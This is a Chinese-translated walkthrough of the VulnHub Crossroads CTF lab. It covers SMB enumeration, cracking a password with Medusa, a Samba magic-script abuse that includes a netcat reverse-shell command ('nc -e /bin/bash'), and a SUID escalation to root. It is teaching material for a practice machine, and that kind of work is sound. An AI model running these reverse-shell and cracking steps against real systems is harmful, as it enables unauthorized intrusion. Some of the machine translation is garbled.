<html>
<head>
<title>VulnHub — Crossroads Walkthrough</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">VulnHub —十字路口漫游</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/vulnhub-crossroads-walkthrough-ab67c827bc5c?source=collection_archive---------1-----------------------#2021-06-20">https://infosecwriteups.com/vulnhub-crossroads-walkthrough-ab67c827bc5c?source=collection_archive---------1-----------------------#2021-06-20</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi jn"><img src="../Images/252a3bb64aa7334992a53740c61be8cb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ViSdyfH90hu04_0ZW3DEVw.png"/></div></div></figure><p id="2264" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">VulnHub Crossroads:1 是一个简单的boot2root CTF挑战，你必须利用SMB并获得用户和root标志。</p><p id="3dfb" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">让我们从查找虚拟机的IP开始。</p><figure class="ky kz la lb gt jr gh gi paragraph-image"><div class="gh gi kx"><img src="../Images/2a79a3f41aef07ba3f0d91145a32426d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1352/format:webp/1*sdnizfpBHSuA9pxnMfggoQ.png"/></div><figcaption class="lc ld gj gh gi le lf bd b be z dk translated">Crossroads虚拟机的IP</figcaption></figure><p id="6e7e" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">然后，让我们执行传统的Nmap扫描。</p><figure class="ky kz la lb gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi lg"><img src="../Images/afee6e603b0ed92273d4337d3321ce1c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1380/format:webp/1*_k3iTuLfeKLXJpxSKglRTg.png"/></div></div><figcaption class="lc ld gj gh gi le lf bd b be z dk translated">Nmap扫描结果</figcaption></figure><p id="2784" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">你会遇到三个开放的港口，</p><ul class=""><li id="bdfd" class="lh li iq ka b kb kc kf kg kj lj kn lk kr ll kv lm ln lo lp bi translated">端口80 — HTTP</li><li id="bf8c" class="lh li iq ka b kb lq kf lr kj ls kn lt kr lu kv lm ln lo lp bi translated">端口139 —中小型企业</li><li id="7b90" class="lh li iq ka b kb lq kf lr kj ls kn lt kr lu kv lm ln lo lp bi translated">端口445 —中小型企业</li></ul><p id="aee3" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">Web应用不是一个侥幸的地方。我尝试了不同的攻击，如登录和注册表单上的SQL注入，但不成功。</p><figure class="ky kz la lb gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi lv"><img src="../Images/c4ec161b51faea6917f229bb4c26f819.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*cwTBiTQEjvkfo5ySl8VRgg.png"/></div></div><figcaption class="lc ld gj gh gi le lf bd b be z dk translated">网络应用</figcaption></figure><p id="1d4f" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">然后，我尝试暴力强制目录。</p><figure class="ky kz la lb gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi lw"><img src="../Images/9f6cee65b1dcb9649acecd01a98c337d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*IBkGX1QWzP_zbu7c5PnOsA.png"/></div></div><figcaption class="lc ld gj gh gi le lf bd b be z dk translated">Gobuster目录暴力破解</figcaption></figure><p id="7da6" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我可以找到两个隐藏的目录，</p><ul class=""><li id="93fe" class="lh li iq ka b kb kc kf kg kj lj kn lk kr ll kv lm ln lo lp bi translated">note.txt</li><li id="2893" class="lh li iq ka b kb lq kf lr kj ls kn lt kr lu kv lm ln lo lp bi translated">robots.txt</li></ul><p id="853d" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我们来看看robots.txt。</p><figure class="ky kz la lb gt jr gh gi paragraph-image"><div class="gh gi lx"><img src="../Images/5b385116f98cf72c1bab90923aa4b975.png" data-original-src="https://miro.medium.com/v2/resize:fit:752/format:webp/1*jAFidxNRED11deqv6oMxjw.png"/></div><figcaption class="lc ld gj gh gi le lf bd b be z dk translated">robots.txt</figcaption></figure><p id="c17a" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">它指出了另一个名为crossroads.png的隐藏文件，所以让我们来看看这个图像。</p><figure class="ky kz la lb gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi ly"><img src="../Images/ef7da89461d021cb74792b6aec56d921.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*2Qr8pMBTLEFoO0rhOohObg.png"/></div></div><figcaption class="lc ld gj gh gi le lf bd b be z dk translated">crossroads.png</figcaption></figure><p id="5d90" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">好像没什么用。所以我们来看看note.txt。</p><figure class="ky kz la lb gt jr gh gi paragraph-image"><div class="gh gi lz"><img src="../Images/2346452dc8baa73b513a58aa28956634.png" data-original-src="https://miro.medium.com/v2/resize:fit:726/format:webp/1*_LyP4fPKi6S7l5e59zEKVw.png"/></div><figcaption class="lc ld gj gh gi le lf bd b be z dk translated">note.txt</figcaption></figure><p id="8b2a" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">它讲述了三种蓝调。我不知道那是什么意思，所以我谷歌了一下，找到了以下内容。</p><figure class="ky kz la lb gt jr gh gi paragraph-image"><div class="gh gi ma"><img src="../Images/d96f072a01627f02f4565a7228ae19b2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1284/format:webp/1*uQMlrVHoQ-s2yUcvPPMNpA.png"/></div><figcaption class="lc ld gj gh gi le lf bd b be z dk translated">三首布鲁斯之王</figcaption></figure><p id="0da8" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">这些名字可能是与我们的机器相关联的用户名的暗示。</p><p id="1466" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">由于web应用程序没有用，让我们用enum4linux列举SMB共享。</p><figure class="ky kz la lb gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mb"><img src="../Images/2abc6dae19614e7ade93a001aa065a62.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*9IRuLENmERvOiNTnLpI3fg.png"/></div></div><figcaption class="lc ld gj gh gi le lf bd b be z dk translated">enum4linux</figcaption></figure><p id="d649" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我们可以找到蓝调三大天王之一；阿尔伯特:)</p><figure class="ky kz la lb gt jr gh gi paragraph-image"><div class="gh gi mc"><img src="../Images/2bc3c9dd18fad06f259f7ad0b869d884.png" data-original-src="https://miro.medium.com/v2/resize:fit:1386/format:webp/1*uMB3wdqf4_7aYOkgtd1Mqg.png"/></div><figcaption class="lc ld gj gh gi le lf bd b be z dk translated">用户艾伯特</figcaption></figure><p id="8d6b" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">然后我试着破解了艾伯特的SMB share的密码。</p><p id="3789" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">使用九头蛇是一场噩梦，因为预计时间约为40小时。所以，我用了美杜莎。</p><figure class="ky kz la lb gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi md"><img src="../Images/61f99bed7d1d9aa86b34b89ccf4c9fd9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*thNXKyxUjEERjzvqb4GvaA.png"/></div></div><figcaption class="lc ld gj gh gi le lf bd b be z dk translated">用美杜莎破解艾伯特的密码</figcaption></figure><p id="4f14" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">不到一分钟，我就找到了艾伯特的密码，名字是<strong class="ka ir">布拉德利1 </strong>。</p><figure class="ky kz la lb gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi me"><img src="../Images/af94ad43e7fd142ecc7a2298e68a0145.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*o5AuQP-gGsIUmE2leqiu_A.png"/></div></div><figcaption class="lc ld gj gh gi le lf bd b be z dk translated">破解了艾伯特的密码</figcaption></figure><p id="e980" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">因此，让我们继续使用上述凭据登录SMB共享。</p><figure class="ky kz la lb gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mf"><img src="../Images/6cae91440ebf0edc7edfe99256348962.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*iDIY2jEhA91UohnzHI_p2w.png"/></div></div><figcaption class="lc ld gj gh gi le lf bd b be z dk translated">中小企业股份os albert</figcaption></figure><p id="e085" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我们可以看到3个文件和一个名为<strong class="ka ir"> smbshare </strong>的目录。</p><p id="9e9d" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">让我们使用<strong class="ka ir"> get </strong>命令下载这3个文件。</p><figure class="ky kz la lb gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mg"><img src="../Images/bda6ae5204ed33e0d6c782188268861b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*0vzMsVpXpHCJNYVlBFSa_w.png"/></div></div><figcaption class="lc ld gj gh gi le lf bd b be z dk translated">下载文件</figcaption></figure><p id="237b" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">将目录更改为<strong class="ka ir"> smbshare </strong>并下载<strong class="ka ir"> smb.conf </strong>文件。</p><figure class="ky kz la lb gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mh"><img src="../Images/24458c7d375f2a5893fdf7a39a6c3f78.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*YrBnUcghmF2CaGym6OuQdw.png"/></div></div><figcaption class="lc ld gj gh gi le lf bd b be z dk translated">从smbshare目录下载smb.conf</figcaption></figure><p id="fd6e" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">现在我们有4个文件，</p><ul class=""><li id="fbe5" class="lh li iq ka b kb kc kf kg kj lj kn lk kr ll kv lm ln lo lp bi translated">crossroads.png</li><li id="1124" class="lh li iq ka b kb lq kf lr kj ls kn lt kr lu kv lm ln lo lp bi translated">贝鲁特</li><li id="851a" class="lh li iq ka b kb lq kf lr kj ls kn lt kr lu kv lm ln lo lp bi translated">user.txt</li><li id="4ae9" class="lh li iq ka b kb lq kf lr kj ls kn lt kr lu kv lm ln lo lp bi translated">中小企业网</li></ul><p id="a584" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">让我们逐一检查下载的内容。</p><p id="a174" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated"><strong class="ka ir"> user.txt </strong>包含第一个标志。</p><figure class="ky kz la lb gt jr gh gi paragraph-image"><div class="gh gi mi"><img src="../Images/e42007f382f736b3dcb7b5d5dec6ce10.png" data-original-src="https://miro.medium.com/v2/resize:fit:680/format:webp/1*ZLKQTXFmShrwt4Np0Uk4VQ.png"/></div><figcaption class="lc ld gj gh gi le lf bd b be z dk translated">用户标志</figcaption></figure><p id="7e19" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">当我们检查<strong class="ka ir"> smb.conf </strong>文件时，我们可以看到以下条目。</p><figure class="ky kz la lb gt jr gh gi paragraph-image"><div class="gh gi mj"><img src="../Images/7209a7b216a7e8c99e0f7ac59b15591e.png" data-original-src="https://miro.medium.com/v2/resize:fit:670/format:webp/1*XHM33_L9OETRFe7jgun-gA.png"/></div><figcaption class="lc ld gj gh gi le lf bd b be z dk translated">中小企业网</figcaption></figure><p id="09af" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">有一个条目叫做<strong class="ka ir">magic script = smsubscript . sh</strong>。</p><p id="587e" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我们可以创建一个名为<strong class="ka ir">smubscript</strong>的shell脚本，这样我们就可以反向连接到机器。</p><p id="9d2b" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">只需在shell脚本中添加<strong class="ka ir"> nc -e /bin/bash &lt;主机IP &gt; &lt;主机端口&gt; </strong>，执行时产生netcat反向shell。</p><figure class="ky kz la lb gt jr gh gi paragraph-image"><div class="gh gi mk"><img src="../Images/eeccb2cc0450e2b455a0e63d0df7acad.png" data-original-src="https://miro.medium.com/v2/resize:fit:702/format:webp/1*7-5Hzvb1xWrjUAHymjooLg.png"/></div><figcaption class="lc ld gj gh gi le lf bd b be z dk translated">smsubscript . sh</figcaption></figure><p id="f31f" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">授予所有用户对脚本的读、写、可执行权限。</p><p id="2deb" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">然后设置一个netcat监听器。</p><figure class="ky kz la lb gt jr gh gi paragraph-image"><div class="gh gi ml"><img src="../Images/976eef5da9a6eedf2accc229575f8570.png" data-original-src="https://miro.medium.com/v2/resize:fit:596/format:webp/1*URPk6_dA0hEdRlERRe0w0w.png"/></div><figcaption class="lc ld gj gh gi le lf bd b be z dk translated">netcat监听器</figcaption></figure><p id="d556" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">神奇的脚本应该在<strong class="ka ir"> smbshare中执行。</strong>那么，让我们以albert的身份登录smbshare，并使用<strong class="ka ir"> put </strong>命令上传我们的<strong class="ka ir">smsubscript . sh</strong>文件。</p><figure class="ky kz la lb gt jr gh gi paragraph-image"><div class="gh gi mm"><img src="../Images/f2a29043f1b01e500adc6c72f8411688.png" data-original-src="https://miro.medium.com/v2/resize:fit:1088/format:webp/1*wB3DZglVCTV2EA4wjWte2g.png"/></div><figcaption class="lc ld gj gh gi le lf bd b be z dk translated">上传smbscript.sh</figcaption></figure><p id="153e" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">看一下netcat监听器。我们得到了一个反壳。</p><figure class="ky kz la lb gt jr gh gi paragraph-image"><div class="gh gi mn"><img src="../Images/701f4693f035d6c5f161406f9c7e27fa.png" data-original-src="https://miro.medium.com/v2/resize:fit:1282/format:webp/1*E8hDPMnMt4McInycrb-3SA.png"/></div><figcaption class="lc ld gj gh gi le lf bd b be z dk translated">反向外壳</figcaption></figure><p id="00db" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我们需要使接收到的哑壳稳定。你可以按照这些<a class="ae kw" href="https://null-byte.wonderhowto.com/how-to/upgrade-dumb-shell-fully-interactive-shell-for-more-flexibility-0197224/" rel="noopener ugc nofollow" target="_blank">指令</a>去做。</p><p id="ad00" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">如果我们看一下SUID的二进制文件，我们可以看到,<strong class="ka ir"> beroot </strong>文件可以作为root运行。</p><figure class="ky kz la lb gt jr gh gi paragraph-image"><div class="gh gi mo"><img src="../Images/48a89afc4d2a8bff9ccbac8c0aba4394.png" data-original-src="https://miro.medium.com/v2/resize:fit:1384/format:webp/1*NytQ7JoGgyRHKnZ9gJIXtw.png"/></div><figcaption class="lc ld gj gh gi le lf bd b be z dk translated">SUID双星</figcaption></figure><p id="ba85" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">让我们来看看beroot文件。</p><figure class="ky kz la lb gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mp"><img src="../Images/6e71065a992fcd37c1c2b41b157dcdbb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*NCAa7m2tzGc1Mqqcs0cugQ.png"/></div></div><figcaption class="lc ld gj gh gi le lf bd b be z dk translated">beroot文件</figcaption></figure><p id="901e" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我们可以清楚地了解到，它可以用来成为root。那么，让我们继续运行这个文件。</p><figure class="ky kz la lb gt jr gh gi paragraph-image"><div class="gh gi mq"><img src="../Images/46ac44e7d39c929d5f4afa642cda8b3c.png" data-original-src="https://miro.medium.com/v2/resize:fit:840/format:webp/1*Ato1lhAhERTrnUzlcwbBCw.png"/></div><figcaption class="lc ld gj gh gi le lf bd b be z dk translated">运行beroot文件</figcaption></figure><p id="74b6" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">它要求一个我们不知道的密码。</p><figure class="ky kz la lb gt jr gh gi paragraph-image"><div class="gh gi mr"><img src="../Images/2dbbd7dead476cc591f26e99dc6f771e.png" data-original-src="https://miro.medium.com/v2/resize:fit:502/format:webp/1*BvdyBHZuPR6WooWUMn1wyg.png"/></div><figcaption class="lc ld gj gh gi le lf bd b be z dk translated">beroot要求输入密码</figcaption></figure><p id="06e2" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">到目前为止，我们已经检查了SMB共享下载内容中的3个文件。只有图像<strong class="ka ir">crossroads.png</strong>留下来看。由于这是一幅图像，可能涉及速记。我们可以使用像stegoveritas这样的工具来检查我们的图像。</p><figure class="ky kz la lb gt jr gh gi paragraph-image"><div class="gh gi ms"><img src="../Images/65f6ebdfde034c045b8b4645305d0537.png" data-original-src="https://miro.medium.com/v2/resize:fit:906/format:webp/1*mXqODtX-TK41tJqSRZBdCg.png"/></div><figcaption class="lc ld gj gh gi le lf bd b be z dk translated">stegoveritas</figcaption></figure><p id="6370" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">扫描后，它生成一个名为<strong class="ka ir">的新目录结果。</strong>里面还有一个叫做<strong class="ka ir"> keepers </strong>的目录。如果我们看一下第一个文件，我们会发现它是一个单词列表。我们可以尝试破解beroot文件的密码。</p><figure class="ky kz la lb gt jr gh gi paragraph-image"><div class="gh gi mt"><img src="../Images/df52a9c5e79d6a50b8fe2c6ae54bf272.png" data-original-src="https://miro.medium.com/v2/resize:fit:1074/format:webp/1*Diijt9p7law8aBr0t8fIkw.png"/></div><figcaption class="lc ld gj gh gi le lf bd b be z dk translated">单词表</figcaption></figure><p id="7900" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">让我们将它作为<strong class="ka ir"> passwrds.txt </strong>复制到主目录。</p><figure class="ky kz la lb gt jr gh gi paragraph-image"><div class="gh gi mu"><img src="../Images/58112e34a8fcf6c409a2297a92ca7958.png" data-original-src="https://miro.medium.com/v2/resize:fit:744/format:webp/1*8NqLWj6a4r70NN597YnaYQ.png"/></div><figcaption class="lc ld gj gh gi le lf bd b be z dk translated">cat passwrds.txt</figcaption></figure><p id="4776" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">让我们使用python创建一个简单的http服务器，以便将我们的文件上传到受害者。</p><figure class="ky kz la lb gt jr gh gi paragraph-image"><div class="gh gi mv"><img src="../Images/f0e7d98ee3e25e517dfc4f155f996382.png" data-original-src="https://miro.medium.com/v2/resize:fit:1142/format:webp/1*g6L20yfwE2n3dtUuzO4aTQ.png"/></div><figcaption class="lc ld gj gh gi le lf bd b be z dk translated">创建简单的http服务器</figcaption></figure><p id="d827" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我们可以使用受害者中的<strong class="ka ir"> wget </strong>来上传passwrds.txt文件。</p><figure class="ky kz la lb gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mw"><img src="../Images/72fd60a750d29edac96e9d67cfdb4a52.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*CM84YyrwUzvhDOMnPMxFCA.png"/></div></div><figcaption class="lc ld gj gh gi le lf bd b be z dk translated">wget http:// <host ip=""> / <file name=""/></host></figcaption></figure><p id="4b64" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">现在，我们可以编写一个简单的bash脚本来遍历我们的密码列表，并暴力破解beroot的密码。</p><figure class="ky kz la lb gt jr gh gi paragraph-image"><div class="gh gi mx"><img src="../Images/14f5ca6322a7e716994938f1675a20df.png" data-original-src="https://miro.medium.com/v2/resize:fit:1090/format:webp/1*X0CjtB1cPZitIYSrD5dgrw.png"/></div><figcaption class="lc ld gj gh gi le lf bd b be z dk translated">暴力破解的bash脚本</figcaption></figure><p id="f7e7" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">向脚本(chmod +x)提供执行权限并执行它。</p><p id="03e9" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">一旦完成，我们会得到另一个名为<strong class="ka ir"> rootcreds </strong>的文件。</p><figure class="ky kz la lb gt jr gh gi paragraph-image"><div class="gh gi my"><img src="../Images/24d1197b1b1806716471caa65b29d3f5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1254/format:webp/1*KKvSnLbAyhDHA2SJyRNEXg.png"/></div><figcaption class="lc ld gj gh gi le lf bd b be z dk translated">根证书</figcaption></figure><p id="23a1" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我们可以通过查看该文件来获取root用户的凭据。</p><figure class="ky kz la lb gt jr gh gi paragraph-image"><div class="gh gi mz"><img src="../Images/8f7b881b9955dbdb8615379b4b2039b1.png" data-original-src="https://miro.medium.com/v2/resize:fit:944/format:webp/1*1bCDMXo6j3YXeN9yu4-4Hg.png"/></div><figcaption class="lc ld gj gh gi le lf bd b be z dk translated">根凭据</figcaption></figure><p id="1540" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">让我们继续将用户更改为root，并提供上述凭据。</p><figure class="ky kz la lb gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi na"><img src="../Images/b152814834d290f84aabe7c83ba220cb.png" data-original-src="https://miro.medium.com/v2/resize:fit:808/format:webp/1*_hslkCojoniLYjQ8PsnFRA.png"/></div></div><figcaption class="lc ld gj gh gi le lf bd b be z dk translated">成为根</figcaption></figure><p id="8d74" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">瞧啊。！！我们是根！！！</p><p id="c9e6" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我们可以从root的主目录中获得第二个标志。</p><figure class="ky kz la lb gt jr gh gi paragraph-image"><div class="gh gi nb"><img src="../Images/8b9c51c410aa447e9043de21a0250a61.png" data-original-src="https://miro.medium.com/v2/resize:fit:714/format:webp/1*e9pgp9e-_YGq1MC1dq8TZw.png"/></div><figcaption class="lc ld gj gh gi le lf bd b be z dk translated">根标志</figcaption></figure><p id="1161" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我希望你喜欢这个挑战，也学到了一些东西。通过<a class="ae kw" href="https://www.linkedin.com/in/ravishanka-silva-a632351a0/" rel="noopener ugc nofollow" target="_blank"> LinkedIn </a>联系我。</p><p id="2110" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">祝你在前方捕捉旗帜时好运！！！</p></div></div>    
</body>
</html>